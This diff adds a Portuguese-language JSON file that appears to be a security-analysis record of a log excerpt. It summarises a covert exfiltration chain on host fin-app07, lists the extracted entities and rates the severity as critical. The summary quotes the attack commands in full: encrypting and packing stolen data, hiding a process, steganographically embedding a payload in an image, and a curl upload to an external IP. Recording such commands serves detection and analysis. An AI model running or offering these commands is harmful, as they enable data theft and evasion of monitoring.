@@ -1,0 +1,29 @@
+{
+  "resumo_comportamental": "No host fin-app07, o processo bash[9060] prepara dados para exfiltração executando 'openssl enc -aes-256-cbc -salt -in /tmp/.cache/exfil_bundle.tar.gz -out /tmp/.cache/exfil_bundle.enc -k S3cr3tK3y!', seguido de 'gzip', 'base64 -w0' e 'zip -r -P Qw3rty! /tmp/.cache/staging.zip'. O processo bash[9070] empacota o binário /tmp/.agent com 'upx -9 -o /tmp/.cache/.agent_packed /tmp/.agent' (exe=/usr/bin/upx) e o move para /usr/local/lib/.agent via 'chmod +x /tmp/.cache/.agent_packed && mv /tmp/.cache/.agent_packed /usr/local/lib/.agent'; em seguida bash[9080] compila 'gcc -o /tmp/.cache/helper /tmp/.cache/helper.c -lpthread' e roda '/tmp/.cache/helper --mode=hide-pid --target=/tmp/.agent' para ocultar o processo. O usuário dbsync inicia pwsh (systemd[1]: Started process 9090 (pwsh) for user dbsync), que executa 'pwsh -NoProfile -Command \"Invoke-PSImage -Image /tmp/.cache/logo.png -Payload /tmp/.cache/stage2.ps1 -Out /tmp/.cache/logo_final.png\"' embutindo payload em imagem via esteganografia, e bash[9091] exfiltra o resultado com 'curl -s -F \"file=@/tmp/.cache/logo_final.png\" http://198.51.100.23/upload'. O trecho representa uma cadeia completa de criptografia, empacotamento (upx), ocultação de processo (hide-pid) e exfiltração furtiva de dados para um IP externo, caracterizando comportamento crítico de exfiltração encoberta.",
+  "entidades_identificadas": [
+    "fin-app07",
+    "bash[9060]",
+    "bash[9070]",
+    "bash[9080]",
+    "bash[9090]",
+    "bash[9091]",
+    "process[9070]",
+    "systemd[1]",
+    "dbsync",
+    "/usr/bin/upx",
+    "pwsh",
+    "/tmp/.agent",
+    "/usr/local/lib/.agent",
+    "/tmp/.cache/helper",
+    "/tmp/.cache/exfil_bundle.tar.gz",
+    "/tmp/.cache/exfil_bundle.enc",
+    "/tmp/.cache/exfil_bundle.enc.gz",
+    "/tmp/.cache/exfil_bundle.b64",
+    "/tmp/.cache/staging.zip",
+    "/tmp/.cache/logo.png",
+    "/tmp/.cache/stage2.ps1",
+    "/tmp/.cache/logo_final.png",
+    "198.51.100.23"
+  ],
+  "severidade_maxima": "critical"
+}
